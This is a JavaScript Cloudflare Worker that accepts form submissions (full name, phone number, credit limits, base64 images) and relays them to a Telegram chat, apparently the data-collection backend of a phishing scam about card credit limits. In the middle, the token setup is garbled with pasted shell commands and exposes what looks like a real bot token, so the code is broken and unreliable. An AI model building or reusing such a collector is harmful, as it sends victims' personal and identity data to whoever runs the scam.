addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

// Utility: parse Data URL (data:image/png;base64,...)
function parseDataUrl(dataUrl) {
    const m = /^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/.exec(dataUrl)
    if (!m) return null
    const contentType = m[1]
    const b64 = m[2]
    // atob not available directly for very large strings; use Uint8Array conversion
    const binary = atob(b64)
    const len = binary.length
    const arr = new Uint8Array(len)
    for (let i = 0; i < len; i++) arr[i] = binary.charCodeAt(i)
    return { contentType, buffer: arr }
}

async function saveToR2(binding, key, arrayBuffer, contentType) {
    if (!binding) return null
    try {
        await binding.put(key, arrayBuffer, { httpMetadata: { contentType } })
        return { key }
    } catch (e) {
        return { error: e.message }
    }
}

// NOTE: This Worker WILL call Telegram directly. It reads secrets from
// `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` environment (set via wrangler
// secrets). It sends a text message using sendMessage and any images using
// sendPhoto. This simplifies deployment but requires keeping the bot token
// secret in the Cloudflare account (use `wrangler secret put`).

async function handleRequest(request) {
    const url = new URL(request.url)
    if (url.pathname === '/health' || url.pathname === '/api/health') {
        return new Response(JSON.stringify({ status: 'ok' }), { status: 200, headers: { 'Content-Type': 'application/json' } })
    }

    if (url.pathname === '/api/field-update' && request.method === 'POST') {
        try {
            const payload = await request.json()
            const sessionId = payload.sessionId || payload.session || null
            if (!sessionId) return new Response(JSON.stringify({ status: 'err', error: 'missing_sessionId' }), { status: 400, headers: { 'Content-Type': 'application/json' } })

            // Build text message similar to original server
            const lines = []
            lines.push('\u2709\ufe0f <b>PHI\u00caN G\u1eecI TH\u00d4NG TIN</b>')
            lines.push(`Phi\u00ean: <code>${sessionId}</code>`)
            if (payload.page) lines.push(`Trang: <code>${payload.page}</code>`)
            if (payload.fullName) lines.push(`H\u1ecd v\u00e0 T\u00ean: <b>${payload.fullName}</b>`)
            if (payload.limitGranted !== undefined) lines.push(`H\u1ea1n M\u1ee9c \u0111\u01b0\u1ee3c C\u1ea5p: <code>${payload.limitGranted}</code>`)
            if (payload.limitAvailable !== undefined) lines.push(`H\u1ea1n M\u1ee9c Kh\u1ea3 D\u1ee5ng: <code>${payload.limitAvailable}</code>`)
            if (payload.phone) lines.push(`SDT: <code>${payload.phone}</code>`)
            lines.push(`Th\u1eddi gian: <code>${new Date().toISOString()}</code>`)

            const textMessage = lines.join('\n')

            // Prepare results container
            const results = { telegram: [], errors: [] }

            // Limits to protect Worker runtime and Telegram
            const MAX_IMAGE_BYTES = 2 * 1024 * 1024 // 2 MB per image
            const MAX_IMAGES = 5 // max images per request

            // Prepare telegram target from secrets
            const T8308693844: AAEe8ULvEqsIbQ9OYEbnsVv9_ONgAH4iAl4
                = wrangler secret put TELEGRAM_BOT_TOKEN
# sau đó paste giá trị token mới, nhấn Enter
                = wrangler secret put 8308693844: AAEe8ULvEqsIbQ9OYEbnsVv9_ONgAH4iAl4

# sau đó paste giá trị token mới, nhấn Enter
                || (typeof TELEGRAM_BOT_TOKEN !== 'undefined' ? wrangler secret put wrangler secret put TELEGRAM_BOT_TOKEN
# sau đó paste giá trị token mới, nhấn Enter
# sau đó paste giá trị token mới, nhấn Enter
            : null)
            const TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID || (typeof TELEGRAM_CHAT_ID !== 'undefined' ? TELEGRAM_CHAT_ID : null)
            // wrangler will inject secrets as globals via bindings; however, in
            // Workers we access them as global names. Guard if missing.
            const token = typeof TELEGRAM_BOT_TOKEN !== 'undefined' && TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN : (typeof TELEGRAM_TOKEN !== 'undefined' ? TELEGRAM_TOKEN : null)
            const chatId = typeof TELEGRAM_CHAT_ID !== 'undefined' && TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID : (typeof TELEGRAM_CHAT_ID !== 'undefined' ? TELEGRAM_CHAT_ID : null)

            if (!token || !chatId) {
                return new Response(JSON.stringify({ status: 'err', error: 'missing_telegram_secrets' }), { status: 500, headers: { 'Content-Type': 'application/json' } })
            }

            const tgBase = `https://api.telegram.org/bot${token}`

            // Send the text message as HTML-formatted message
            try {
                const sendRes = await fetch(`${tgBase}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: 'HTML', disable_notification: false })
                })
                const sendJson = await sendRes.json()
                results.telegram.push({ type: 'message', response: sendJson })
            } catch (e) {
                results.errors.push({ stage: 'sendMessage', error: e.message })
            }

            // Helper: handle a single data url and send via sendPhoto
            async function handleDataUrlSend(dataUrl, caption) {
                const parsed = parseDataUrl(dataUrl)
                if (!parsed) return { error: 'invalid_data_url' }

                // Reject too-large images early
                if (parsed.buffer && parsed.buffer.length > MAX_IMAGE_BYTES) {
                    return { error: 'image_too_large', size: parsed.buffer.length }
                }
                // Telegram supports multipart/form-data for sending files. Use fetch with FormData.
                const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2)
                const CRLF = '\r\n'
                const meta = []
                meta.push(`--${boundary}`)
                meta.push(`Content-Disposition: form-data; name="chat_id"`)
                meta.push('')
                meta.push(String(chatId))
                meta.push(`--${boundary}`)
                meta.push(`Content-Disposition: form-data; name="caption"`)
                meta.push('')
                meta.push(caption || '')
                meta.push(`--${boundary}`)
                meta.push(`Content-Disposition: form-data; name="photo"; filename="file.png"`)
                meta.push(`Content-Type: ${parsed.contentType}`)
                meta.push('')
                const prefix = meta.join(CRLF) + CRLF
                const suffix = CRLF + `--${boundary}--` + CRLF

                // Build a Uint8Array for the multipart body
                const enc = new TextEncoder()
                const p1 = enc.encode(prefix)
                const p2 = parsed.buffer
                const p3 = enc.encode(suffix)
                const body = new Uint8Array(p1.length + p2.length + p3.length)
                body.set(p1, 0)
                body.set(p2, p1.length)
                body.set(p3, p1.length + p2.length)

                try {
                    const res = await fetch(`${tgBase}/sendPhoto`, { method: 'POST', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }, body })
                    const j = await res.json()
                    return j
                } catch (e) {
                    return { error: e.message }
                }
            }

            // Find image fields and send them, enforcing count limit
            let sentImages = 0
            for (const k of Object.keys(payload)) {
                if (sentImages >= MAX_IMAGES) break
                const v = payload[k]
                if (!v) continue
                if (typeof v === 'string' && v.startsWith('data:')) {
                    const caption = `File: ${k} - Phiên: ${sessionId}`
                    const r = await handleDataUrlSend(v, caption)
                    results.telegram.push({ type: 'photo', field: k, response: r })
                    if (!r || r.error) results.errors.push({ field: k, error: r && r.error ? r.error : 'unknown' })
                    sentImages++
                }
                if (k === 'images' && Array.isArray(v)) {
                    for (let i = 0; i < v.length && sentImages < MAX_IMAGES; i++) {
                        const item = v[i]
                        if (typeof item === 'string' && item.startsWith('data:')) {
                            const caption = `Image ${i} - Phiên: ${sessionId}`
                            const r = await handleDataUrlSend(item, caption)
                            results.telegram.push({ type: 'photo', field: `images_${i}`, response: r })
                            if (!r || r.error) results.errors.push({ field: `images_${i}`, error: r && r.error ? r.error : 'unknown' })
                            sentImages++
                        }
                    }
                }
            }

            return new Response(JSON.stringify({ status: 'ok', results }), { status: 200, headers: { 'Content-Type': 'application/json' } })
        } catch (e) {
            return new Response(JSON.stringify({ status: 'err', error: e.message }), { status: 500, headers: { 'Content-Type': 'application/json' } })
        }
    }

    return new Response('Not found', { status: 404 })
}
